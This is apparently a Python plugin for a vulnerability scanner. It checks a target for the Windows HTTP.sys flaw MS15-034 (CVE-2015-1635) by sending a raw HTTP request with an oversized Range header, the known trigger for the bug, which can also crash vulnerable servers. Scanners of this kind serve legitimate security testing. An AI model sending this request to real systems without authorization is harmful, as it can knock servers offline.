# coding:utf-8
import socket


plugin_info = {
    "name": "HTTP.sys 远程代码执行",
    "info": "MS15-034 HTTP.sys 远程代码执行（CVE-2015-1635），但目前仅能作为DOS攻击",
    "level": "中危",
    "type": "DOS",
    "url": "https://www.secpulse.com/archives/6009.html",
    "vulinfo": "",
}

def get_plugin_info():
    return plugin_info


def check(webinfo,ip,port,domain,timeout):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        flag = "GET / HTTP/1.0\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n"
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if 'Requested Range Not Satisfiable' in data:
            plugin_info['vulinfo'] = u"存在HTTP.sys远程代码执行漏洞"
            return 1
    except:
        pass
    return 0